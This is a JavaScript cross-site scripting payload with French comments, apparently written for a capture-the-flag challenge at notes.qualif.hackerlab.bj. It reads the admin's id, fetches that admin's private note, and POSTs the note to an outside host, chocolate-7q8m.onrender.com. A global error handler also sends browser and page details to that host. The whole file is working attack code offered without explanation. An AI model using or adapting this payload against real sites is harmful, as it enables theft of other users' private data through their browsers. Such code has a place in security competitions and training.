function exfiltrateData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/data", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("data=" + encodeURIComponent(data));
  }

  function reportError(errorDetails) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://chocolate-7q8m.onrender.com/api/error", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(errorDetails));
  }

  function getXmlHttpRequestDetails(xhr) {
    return {
      status: xhr.status,
      statusText: xhr.statusText,
      responseURL: xhr.responseURL,
      responseText: xhr.responseText,
      readyState: xhr.readyState
    };
  }

  // Gestionnaire global pour les erreurs non capturées
  window.onerror = function(message, source, lineno, colno, error) {
    var errorDetails = {
      message: message,
      source: source,
      lineno: lineno,
      colno: colno,
      error: error ? error.stack : null,
      userAgent: navigator.userAgent,
      url: window.location.href,
      referrer: document.referrer
    };
    reportError(errorDetails);
  };

  try {
    // Créer une nouvelle instance de XMLHttpRequest pour récupérer l'admin_id
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://notes.qualif.hackerlab.bj/api.php", true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        if (xhr.status == 200) {
          try {
            var response = JSON.parse(xhr.responseText);
            var adminId = response.id;

            // Créer une nouvelle instance de XMLHttpRequest pour récupérer le contenu de la note
            var noteXhr = new XMLHttpRequest();
            noteXhr.open("GET", "https://notes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
            noteXhr.onreadystatechange = function() {
              if (noteXhr.readyState == 4) {
                if (noteXhr.status == 200) {
                  var noteContent = noteXhr.responseText;
                  exfiltrateData(noteContent);
                } else {
                  reportError({
                    message: "Error fetching note",
                    ...getXmlHttpRequestDetails(noteXhr),
                    userAgent: navigator.userAgent,
                    url: window.location.href,
                    referrer: document.referrer
                  });
                }
              }
            };
            noteXhr.onerror = function() {
              reportError({
                message: "Request error fetching note",
                ...adminId(noteXhr),
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer
              });
            };
            noteXhr.send();
          } catch (e) {
            reportError({
              message: "Error parsing response",
              error: e.message,
              stack: e.stack,
              ...getXmlHttpRequestDetails(xhr),
              userAgent: navigator.userAgent,
              url: window.location.href,
              referrer: document.referrer
            });
          }
        } else {
          reportError({
            message: "Error fetching admin_id",
            ...getXmlHttpRequestDetails(xhr),
            userAgent: navigator.userAgent,
            url: window.location.href,
            referrer: document.referrer
          });
        }
      }
    };
    xhr.onerror = function() {
      reportError({
        message: "Request error fetching admin_id",
        ...getXmlHttpRequestDetails(xhr),
        userAgent: navigator.userAgent,
        url: window.location.href,
        referrer: document.referrer
      });
    };
    xhr.send();
  } catch (e) {
    reportError({
      message: "Error initiating requests",
      error: e.message,
      stack: e.stack,
      userAgent: navigator.userAgent,
      url: window.location.href,
      referrer: document.referrer
    });
}